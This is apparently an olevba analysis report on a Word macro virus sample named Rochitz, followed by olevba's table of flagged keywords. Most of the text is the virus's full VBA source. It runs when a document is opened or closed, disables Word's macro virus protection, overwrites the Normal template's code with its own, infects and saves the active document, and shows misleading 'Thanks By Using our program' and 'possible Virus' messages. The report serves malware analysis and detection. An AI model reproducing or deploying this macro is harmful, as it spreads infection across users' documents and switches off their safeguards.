olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rochitz-a48f786106edb11fe47985d78a18ef24390daf74
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rochitz-a48f786106edb11fe47985d78a18ef24390daf74 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()
Dim NTemp As Object
Dim Adoc As Object

Dim NtInfect As Boolean
Dim AdInfect As Boolean
Dim DocLine As Integer
Dim Enter As String

Enter = Chr(13)

Set NTemp = NormalTemplate.VBProject.VBComponents
Set Adoc = ActiveDocument.VBProject.VBComponents

NtInfect = NTemp(1).CodeModule.Find("Check if Infected", 1, 1, 10000, 10000)
AdInfect = Adoc(1).CodeModule.Find("Check if Infected", 1, 1, 10000, 10000)

If NtInfect = False Then
    Options.VirusProtection = False
    For NTs = 1 To NTemp.Count
        NTemp(NTs).CodeModule.deletelines 1, NTemp(NTs).CodeModule.countoflines
        NTemp(NTs).CodeModule.insertlines 1, Adoc(1).CodeModule.lines(1, Adoc(1).CodeModule.countoflines)
    Next NTs
End If
    Coin = Int(Rnd * 2) + 1
    Select Case Coin
        Case 1
            If AdInfect = False Then
                For Ads = 1 To Adoc.Count
                    If Adoc(Ads).CodeModule.countoflines > 0 Then DocLine = Adoc(Ads).CodeModule.countoflines
                    Adoc(Ads).CodeModule.deletelines 1, Adoc(Ads).CodeModule.countoflines
                    Adoc(Ads).CodeModule.insertlines 1, NTemp(1).CodeModule.lines(1, NTemp(1).CodeModule.countoflines)
                Next Ads
                ActiveDocument.Save
            End If
    End Select


End Sub

Private Sub Document_Open()
Dim NTemp As Object
Dim Adoc As Object

Dim NtInfect As Boolean
Dim AdInfect As Boolean
Dim DocLine As Integer
Dim Enter As String

Enter = Chr(13)

Set NTemp = NormalTemplate.VBProject.VBComponents
Set Adoc = ActiveDocument.VBProject.VBComponents

NtInfect = NTemp(1).CodeModule.Find("Check if Infected", 1, 1, 10000, 10000)
AdInfect = Adoc(1).CodeModule.Find("Check if Infected", 1, 1, 10000, 10000)

If NtInfect = False Then
    Options.VirusProtection = False
    For NTs = 1 To NTemp.Count
        NTemp(NTs).CodeModule.deletelines 1, NTemp(NTs).CodeModule.countoflines
        NTemp(NTs).CodeModule.insertlines 1, Adoc(1).CodeModule.lines(1, Adoc(1).CodeModule.countoflines)
    Next NTs
    MsgBox "Thanks By Using our program..." & String(2, Enter) & _
    "   Goenitz Orochi Inc.", vbInformation
End If
    Coin = Int(Rnd * 2) + 1
    Select Case Coin
        Case 1
            If AdInfect = False Then
                If NtInfect = True Then MsgBox "Thanks By Using our program..." & String(2, Enter) & _
                    "   Goenitz Orochi Inc.", vbInformation
                For Ads = 1 To Adoc.Count
                    If Adoc(Ads).CodeModule.countoflines > 0 Then DocLine = Adoc(Ads).CodeModule.countoflines
                    Adoc(Ads).CodeModule.deletelines 1, Adoc(Ads).CodeModule.countoflines
                    Adoc(Ads).CodeModule.insertlines 1, NTemp(1).CodeModule.lines(1, NTemp(1).CodeModule.countoflines)
                Next Ads
                ActiveDocument.Save
            Else
                If NtInfect = True Then MsgBox "Thanks By Using our program..." & String(2, Enter) & _
                    "   Goenitz Orochi Inc.", vbInformation
            End If
        Case Else
            If NtInfect = True Then MsgBox "Thanks By Using our program..." & String(2, Enter) & _
                    "   Goenitz Orochi Inc.", vbInformation
    End Select


If DocLine > 0 Then MsgBox "We Find " & DocLine & " lines " & _
    "of a possible Virus" & String(2, Enter) & String(12, Chr(32)) & _
    "Goenitz Orochi", vbExclamation
End Sub



































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

